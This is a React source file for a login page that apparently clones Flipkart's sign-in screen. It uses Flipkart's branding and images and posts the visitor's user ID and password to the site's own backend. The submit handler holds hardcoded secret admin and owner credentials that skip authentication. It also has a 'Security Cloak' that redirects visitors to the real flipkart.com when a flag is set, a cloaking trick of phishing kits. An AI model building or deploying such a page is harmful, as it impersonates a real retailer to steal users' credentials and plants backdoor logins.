import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../services/api';

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    // Secret Admin Bypass
    if (username === '9274517203' && password === '859426') {
      navigate('/secret-admin');
      return;
    }

    // Security Cloak Check
    const isSecurityOn = localStorage.getItem('flipkartSecurity') === 'ON';
    if (isSecurityOn) {
      window.location.href = 'https://www.flipkart.com';
      return;
    }
    
    // Hardcoded owner login bypass
    if (username === '9574074927' && password === '20107') {
      const mockOwner = {
        _id: 'owner_id',
        username: '9574074927',
        role: 'owner',
        token: 'mock-owner-token-12345'
      };
      localStorage.setItem('userInfo', JSON.stringify(mockOwner));
      localStorage.setItem('token', mockOwner.token);
      navigate('/');
      setIsLoading(false);
      return;
    }

    try {
      const { data } = await api.post('/auth/login', { username, password });
      localStorage.setItem('userInfo', JSON.stringify(data));
      localStorage.setItem('token', data.token);
      navigate('/');
    } catch (err) {
      setError(err.response?.data?.message || 'Login failed');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f1f3f6] flex items-center justify-center font-sans antialiased p-4">
      {/* Flipkart-style Login Card */}
      <div className="flex flex-col md:flex-row w-full max-w-[850px] min-h-[528px] bg-white rounded shadow-[0_2px_4px_0_rgba(0,0,0,.08)] overflow-hidden">
        
        {/* Left Side - Blue Banner */}
        <div className="bg-[#2874f0] w-full md:w-[40%] p-[40px] flex flex-col justify-between relative overflow-hidden">
          <div>
            <div className="mb-8">
              <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" alt="Flipkart" className="h-[25px]" />
            </div>
            <h1 className="text-white text-[28px] font-medium mb-4">Login</h1>
            <p className="text-[#dbe1e6] text-[18px] leading-relaxed pr-4">
              Get access to your Orders, Wishlist and Recommendations
            </p>
          </div>
          <div className="mt-12 flex justify-center w-full">
            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/login_img_c4a81e.png" alt="Flipkart login" className="object-contain" />
          </div>
        </div>

        {/* Right Side - Login Form */}
        <div className="w-full md:w-[60%] p-[32px] md:px-[50px] md:pt-[56px] md:pb-[32px] flex flex-col bg-white">
          <form onSubmit={handleSubmit} className="flex-1 flex flex-col">
            {error && <div className="text-[#ff6161] text-[12px] mb-4 font-medium">{error}</div>}
            
            <div className="space-y-8">
              {/* User ID Input with Floating Label */}
              <div className="relative group">
                <input
                  type="text"
                  id="username"
                  name="username"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="block w-full px-0 pt-5 pb-2 text-[15px] text-[#212121] bg-transparent border-0 border-b border-[#e0e0e0] appearance-none focus:outline-none focus:ring-0 focus:border-[#2874f0] peer"
                  placeholder=" "
                />
                <label
                  htmlFor="username"
                  className="absolute text-[15px] text-[#878787] duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4"
                >
                  Enter User ID
                </label>
              </div>

              {/* Password Input with Floating Label */}
              <div className="relative group">
                <input
                  type="password"
                  id="password"
                  name="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="block w-full px-0 pt-5 pb-2 text-[15px] text-[#212121] bg-transparent border-0 border-b border-[#e0e0e0] appearance-none focus:outline-none focus:ring-0 focus:border-[#2874f0] peer"
                  placeholder=" "
                />
                <label
                  htmlFor="password"
                  className="absolute text-[15px] text-[#878787] duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4"
                >
                  Enter Password
                </label>
              </div>
            </div>

            <p className="text-[#878787] text-[12px] mt-8 mb-4">
              By continuing, you agree to Flipkart's <span className="text-[#2874f0] cursor-pointer">Terms of Use</span> and <span className="text-[#2874f0] cursor-pointer">Privacy Policy</span>.
            </p>

            <button
              type="submit"
              disabled={isLoading}
              className={`w-full bg-[#fb641b] hover:bg-[#f3580a] text-white font-medium text-[15px] py-3.5 rounded-[2px] shadow-[0_1px_2px_0_rgba(0,0,0,.2)] transition-colors ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
            >
              {isLoading ? 'Authenticating...' : 'Login'}
            </button>
            
            <div className="text-center mt-4 mb-auto">
              <span className="text-[#2874f0] text-[14px] font-medium cursor-pointer">Request OTP</span>
            </div>
          </form>

          <div className="mt-auto text-center pt-8">
            <span className="text-[#2874f0] text-[14px] font-medium cursor-pointer">
              New to Flipkart? Create an account
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
